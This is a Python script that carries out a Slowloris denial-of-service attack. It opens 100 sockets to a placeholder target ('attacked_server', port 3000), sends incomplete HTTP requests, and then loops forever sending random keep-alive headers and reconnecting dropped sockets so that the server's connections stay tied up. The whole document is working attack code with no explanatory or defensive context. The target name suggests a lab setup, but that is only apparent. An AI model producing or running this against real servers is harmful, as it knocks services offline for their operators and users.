import random
import socket
import time

# Target details
target_host = 'attacked_server'
target_port = 3000

# Slowloris parameters
num_sockets = 100
interval = 5

# Create and maintain open sockets
sockets = []

print("Starting Slowloris attack...")

# Open initial sockets
for i in range(num_sockets):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target_host, target_port))
        s.send(b"GET / HTTP/1.1\r\n")
        s.send(b"Host: " + target_host.encode('utf-8') + b"\r\n")
        sockets.append(s)
        print(f"Socket {i+1} connected")
    except socket.error as e:
        print(f"Error creating socket {i+1}: {e}")
        break

print(f"Opened {len(sockets)} sockets")

# Send keep-alive headers periodically to maintain open connections
while True:
    for i, s in enumerate(sockets):
        try:
            # Send randomized keep-alive headers
            header = f"X-{random.randint(0, 1000)}: {random.randint(0, 1000)}\r\n"
            s.send(header.encode('utf-8'))
            print(f"Sent keep-alive header on socket {i+1}")
        except socket.error as e:
            print(f"Socket {i+1} closed, reconnecting...")
            sockets.remove(s)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target_host, target_port))
                s.send(b"GET / HTTP/1.1\r\n")
                s.send(b"Host: " + target_host.encode('utf-8') + b"\r\n")
                sockets.append(s)
                print(f"Socket {i+1} reconnected")
            except socket.error as e:
                print(f"Error reconnecting socket {i+1}: {e}")
                continue
    time.sleep(interval)
